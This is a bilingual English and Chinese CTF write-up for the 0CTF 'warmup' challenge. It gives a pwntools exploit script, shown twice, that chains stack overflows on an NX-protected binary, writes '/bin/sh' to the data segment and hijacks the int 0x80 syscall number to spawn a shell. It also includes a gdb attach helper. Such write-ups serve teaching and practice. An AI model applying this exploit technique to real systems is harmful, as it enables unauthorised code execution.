#Exploit2_warmup

  Inspiration from Yuanming and Skyer.  
  
  This program first prints "Welcome to 0ctf!" and then goes into a function that reads a string from user input.  
  
  Since the NX option is on, we cannot directly put shellcode on stack. Instead, we change the int 80 system call number in eax , thus alter its function.  
  
  The script and explanation are as follows  
  
```
from pwn import *
p=process('./warmup')
p.recvuntil('!')
s=raw_input()

p.send('0'*32+p32(0x80480d8))
  #first overflow, after which jump to start of program#Line 1

p.send('a'*0x30+p32(0x804811d))
  #to get another 104 bytes input#Line2
  #after this the program may quit due to eax<0

p.send(p32(0x80480d8)+p32(0)+p32(0x80491BC)+p32(16)) 
  #back to the beginning #Line3

p.send('/bin/sh\x00'+p32(0x80491BC)+p32(0))
  #to put '/bin/sh' to .data segment,
  #after this jump to 80480d8

p.send('a'*(0x34-20)+p32(0x804811D))
  #jmp to read_func again

p.send(p32(0x8048122)+p32(0)+p32(0x80491BC)+p32(0x80491BC+8)+'/bin/sh\x00\xbc\x91\x04')
  #fd=0,&buffer=0x80491bc,len=whatever,return value=11
  #then jmp to 0x8048122 and do exec, so we successfully spawn a shell ^_^

p.interactive()
```
  And the code used to launch the program and attach gdb to it is attached below, cauz I spent a lot of time struggling with itT T.

bashscript.sh
```
#!/bin/bash
gnome-terminal -x bash -c "python script.py"
sleep 1s
gdb attach `ps -aux|grep ./warmup$ -w|awk '{print $2}'`
```

#中文版  
  
  首先感谢曾宇圣曾老师的指导，以及原铭学长的间接指导233  
  
这个程序开了个NX防护，所以shellcode并不能直接放在栈上。那怎么办呢？幸好程序中输入输出都是用的int 80系统调用，这种调用根据eax寄存器中储存调用号的不同，可以执行读、写、执行等不同操作。所以我们就可以通过篡改调用号，来改变调用的功能。  

  脚本及解释如下  
```
from pwn import *
p=process('./warmup')
p.recvuntil('!')
s=raw_input()

p.send('0'*32+p32(0x80480d8))
  #第一次溢出，跳回到程序开头
  #为什么不是只跳到read_func开头呢，因为要抬高栈（不太懂= =

p.send('a'*0x30+p32(0x804811d))
  #第二次溢出，跳到read开头，继续获取输入

p.send(p32(0x80480d8)+p32(0)+p32(0x80491BC)+p32(16)) 
  #第三次溢出再次跳回到开头，把16个字节放到数据段
  #放完之后跳回80480d8

p.send('/bin/sh\x00'+p32(0x80491BC)+p32(0))
  #16个字节的内容

p.send('a'*(0x34-20)+p32(0x804811D))
  #第四次溢出再跳一次read_func

p.send(p32(0x8048122)+p32(0)+p32(0x80491BC)+p32(0x80491BC+8)+'/bin/sh\x00\xbc\x91\x04')
  #设置int 80的参数fd=0,&buffer=0x80491bc,len=whatever
  #并且使得返回值为11
  #最后跳到8048122去执行shell

p.interactive()
```
  如果是本地溢出的话这样子就可以了，然而曾老师说因为当时服务器上的程序被沙盒保护，无法开进程  
  所以需要同样的方法把eax设置为5打开文件，设置为3读取文件，再设置为4从而打印在屏幕上  
  也就是说要多跳很多很多次= =他们能做出来也是腻害啊我天
